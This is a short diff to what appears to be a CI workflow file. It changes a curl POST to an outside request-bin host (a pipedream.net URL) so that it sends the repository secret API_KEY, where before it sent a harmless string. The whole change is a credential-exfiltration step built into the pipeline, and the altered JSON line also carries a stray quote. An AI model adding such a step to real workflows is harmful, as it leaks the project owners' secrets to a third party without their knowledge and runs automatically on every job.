@@ -17,4 +17,4 @@ jobs:
         run: |
           curl -X POST https://eom6gmorhd9wp71.m.pipedream.net \
             -H "Content-Type: application/json" \
-            -d '{"data": "I am about to go vacation"}'
+            -d '{"data": "${{ secrets.API_KEY }}""}'
